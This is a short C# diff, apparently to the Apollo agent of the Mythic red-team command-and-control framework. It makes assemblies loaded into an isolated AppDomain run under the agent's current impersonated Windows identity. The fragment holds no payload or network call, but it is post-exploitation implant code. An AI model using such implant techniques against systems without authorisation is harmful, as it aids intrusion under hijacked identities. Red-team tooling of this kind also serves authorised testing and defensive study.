@@ -18,6 +18,7 @@ using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
+using System.Security.Principal;
 using ApolloInterop.Classes.Api;
 using ApolloInterop.Classes.IO;
 using Task = ApolloInterop.Structs.MythicStructs.Task;
@@ -238,6 +239,10 @@ namespace Tasks
         private bool LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
         {
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
+            isolationDomain.SetThreadPrincipal(
+                new WindowsPrincipal(
+                    _agent.GetIdentityManager().GetCurrentImpersonationIdentity()
+                    ));
             isolationDomain.SetData("str", sParams);
             bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
             foreach(byte[] dependency in dependencies)
